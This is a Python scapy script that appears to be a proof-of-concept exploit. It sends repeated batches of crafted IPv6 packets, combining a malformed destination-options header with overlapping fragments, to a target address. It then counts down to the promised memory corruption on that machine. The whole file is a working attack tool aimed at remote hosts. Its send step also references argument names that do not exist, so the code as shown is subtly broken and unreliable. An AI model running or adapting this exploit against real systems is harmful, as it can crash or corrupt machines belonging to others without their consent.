#!/usr/bin/env python3

import argparse
from scapy.all import *


def get_packets_with_mac(i, mac_addr, ip_addr):
    frag_id = 0xDEBAC1E + i
    first = (
        Ether(dst=mac_addr)
        / IPv6(fl=1, hlim=64 + i, dst=ip_addr)
        / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata="a" * 3)])
    )
    second = (
        Ether(dst=mac_addr)
        / IPv6(fl=1, hlim=64 + i, dst=ip_addr)
        / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0)
        / "aaaaaaaa"
    )
    third = (
        Ether(dst=mac_addr)
        / IPv6(fl=1, hlim=64 + i, dst=ip_addr)
        / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    )
    return [first, second, third]


def get_packets(i, mac_addr, ip_addr):
    if mac_addr:
        return get_packets_with_mac(i, mac_addr, ip_addr)
    frag_id = 0xDEBAC1E + i
    first = IPv6(fl=1, hlim=64 + i, dst=ip_addr) / IPv6ExtHdrDestOpt(
        options=[PadN(otype=0x81, optdata="a" * 3)]
    )
    second = (
        IPv6(fl=1, hlim=64 + i, dst=ip_addr)
        / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0)
        / "aaaaaaaa"
    )
    third = IPv6(fl=1, hlim=64 + i, dst=ip_addr) / IPv6ExtHdrFragment(
        id=frag_id, m=0, offset=1
    )
    return [first, second, third]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", type=str, help="Target IPv6 address")
    parser.add_argument(
        "-i",
        "--interface",
        type=str,
        help="If you have multiple adapters, you need to choose which one to use to send packets. e.g. `eth0` on linux or `Hyper-V Virtual Ethernet Adapter` on windows. If you're going to use your default interface, leave it empty.",
    )
    parser.add_argument(
        "-t",
        "--tries",
        type=int,
        help="How often should a batch be attempted (default 20)",
    )
    parser.add_argument(
        "-b", "--batches", type=int, help="How many batches to send (default 20)"
    )
    parser.add_argument(
        "-m",
        "--mac",
        type=str,
        help="Leave empty, unless scapy complains it can't find the MAC address.",
    )

    args = parser.parse_args()
    if not args.tries:
        args.tries = 20
    if not args.batches:
        args.batches = 20

    final_ps = []
    for _ in range(args.batches):
        for i in range(args.tries):
            final_ps += get_packets(i, args.mac, args.ip) + get_packets(
                i, args.mac, args.ip
            )

    print("Sending packets")
    if args.mac_addr:
        sendp(final_ps, args.iface)
    else:
        send(final_ps, args.iface)

    for i in range(60):
        print(f"Memory corruption will be triggered in {60-i} seconds", end="\r")
        time.sleep(1)
    print("")


if __name__ == "__main__":
    main()
